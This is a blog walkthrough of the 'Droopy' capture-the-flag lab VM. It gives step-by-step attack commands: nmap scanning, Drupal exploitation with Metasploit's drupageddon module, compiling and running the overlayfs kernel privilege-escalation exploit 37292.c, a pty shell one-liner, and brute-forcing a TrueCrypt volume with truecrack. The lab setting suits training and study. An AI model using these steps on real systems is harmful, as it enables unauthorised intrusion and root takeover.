@@ -1,0 +1,385 @@
+
+								
+																		Hack the Droopy VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on August 30, 2016
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Welcome to another boot2root CTF Challenge “Droopy:” uploaded by knightmare on vulnhub. As, there is a theme, and you will need to snag the flag in order to complete the challenge and you can download it from https://www.vulnhub.com/?q=droopy&amp;sort=date-des&amp;type=vm
+Penetrating Methodologies:
+
+Network Scanning (Netdiscover, Nmap)
+Identifies Drupal CMS
+Exploiting Drupal CMs (Metasploit)
+Privilege Escalation with Kernel Exploit
+Uploading and Downloading dave.tc from /www/html
+Generate a Dictionary with the help of rockyou.txt
+Brute Force attack on Truecrypt Volume (Truecrack)
+Decrypting File (Veracrypt)
+Capture the Flag
+
+Walkthrough
+Let us start by scanning the network so that we can know the IP of our target. And to scan the network types the following:
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+
+So by using the above command, we know our target IP is 192.168.1.102. Now that we know our target IP, let’s study it more by using nmap :
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 192.168.1.102
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 192.168.1.102
+					
+				
+			
+		
+
+
+By using nmap we find that port no. 80 is the only one that is opened. So, therefore, lets fire up the IP in the browser.
+
+By studying the webpage we get to know that the website has been made in Drupal CMS. And we all know that there is a very effective exploit for it in Metasploit and to use that type :
+
+		
+		
+			
+			
+			
+			
+use exploit/multi/http/drupal_drupageddon
+set rhost 192.168.1.102
+exploit
+			
+				
+					
+				
+					123
+				
+						use exploit/multi/http/drupal_drupageddonset rhost 192.168.1.102exploit
+					
+				
+			
+		
+
+
+By executing the sysinfo command, we have enumerated the version of kernel ” 3.13.0″ installed in the victim’s machine. then we look its exploit for privilege escalation with help of the following command.
+
+		
+		
+			
+			
+			
+			
+searchsploit 3.13.0
+			
+				
+					
+				
+					1
+				
+						searchsploit 3.13.0
+					
+				
+			
+		
+
+Luckily we found an exploit “overlayfs local Privilege” at path /usr/share/exploitdb/exploits/Linux/local/37292.c and even you can copy this file on the desktop.
+
+Go to the /tmp folder by typing cd /tmp and upload the exploit there by typing :
+
+		
+		
+			
+			
+			
+			
+upload /root/Desktop/37292.c
+			
+				
+					
+				
+					1
+				
+						upload /root/Desktop/37292.c
+					
+				
+			
+		
+
+Once the exploit is uploaded, go to the shell by simply giving shell command. And then type :
+
+		
+		
+			
+			
+			
+			
+python -c 'import pty;pty.spawn("/bin/bash")'
+			
+				
+					
+				
+					1
+				
+						python -c 'import pty;pty.spawn("/bin/bash")'
+					
+				
+			
+		
+
+And then type the following command to compile the exploit :
+
+		
+		
+			
+			
+			
+			
+gcc 37292.c -o shell
+			
+				
+					
+				
+					1
+				
+						gcc 37292.c -o shell
+					
+				
+			
+		
+
+once the exploit is compiled give the permissions to shell :
+
+		
+		
+			
+			
+			
+			
+chmod 777 shell
+			
+				
+					
+				
+					1
+				
+						chmod 777 shell
+					
+				
+			
+		
+
+And then run the ./shell command for your exploit to work. This is the exploit for privilege escalation so when this exploit runs, you will have your privilege to the VM.
+After this check, you id by simply typing id.  It shows that you are the root. So let’s jump to the folder root by typing cd /root and then type ls to check the file inside the root folder. And here we have one file in the root. Let’s copy it to var/www/html so we can open the file in the browser :
+
+		
+		
+			
+			
+			
+			
+cp dave.tc /var/www/html
+			
+				
+					
+				
+					1
+				
+						cp dave.tc /var/www/html
+					
+				
+			
+		
+
+
+Now, let’s open the file in the browser by typing :
+
+		
+		
+			
+			
+			
+			
+192.168.1.102/dave.tc
+			
+				
+					
+				
+					1
+				
+						192.168.1.102/dave.tc
+					
+				
+			
+		
+
+
+And then we will go into the /var by typing cd /var and then type ls to view its content. Now, let’s go into the mail by typing cd mail and then ls to view its content. And the type cat www-data to read whatever’s inside it.
+
+In www-data we find a mail. This mail gives us two hints about the password that we need i.e. we will find our password in the rockyou wordlist and password contain prefix or suffix “academy”. So we will take all the words from rockyou wordlist that has an academy in it and make a different wordlist with all the possible passwords. And for this type :
+
+		
+		
+			
+			
+			
+			
+cat rockyou.txt | grep academy &gt; /root/Desktop/dict.txt
+			
+				
+					
+				
+					1
+				
+						cat rockyou.txt | grep academy &gt; /root/Desktop/dict.txt
+					
+				
+			
+		
+
+
+Now from the wordlist, that we just created, we will apply a dictionary attack to have our password. And so for this type :
+
+		
+		
+			
+			
+			
+			
+truecrack --truecrypt /root/Downloads/dave.tc -k SHA512 -w /root/Desktop/dict.txt
+			
+				
+					
+				
+					1
+				
+						truecrack --truecrypt /root/Downloads/dave.tc -k SHA512 -w /root/Desktop/dict.txt
+					
+				
+			
+		
+
+
+Now using veracrypt we can decrypt the file.
+
+To decrypt the file enter the password that we just found.
+
+Once it opens you can see all of its content.
+
+Following are the folders you will find in it.
+
+Open its path in the terminal of kali and type ls -la to view the files. Open secret by typing cd .secret and the type ls -la to see its content. And then open .top by typing cd .top and then type ls -la to see all the files in it. There you will find flag.txt, type cat flag.txt to view the flag.
+
+And yippee!!! We found our flag. 😊
+Author: Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
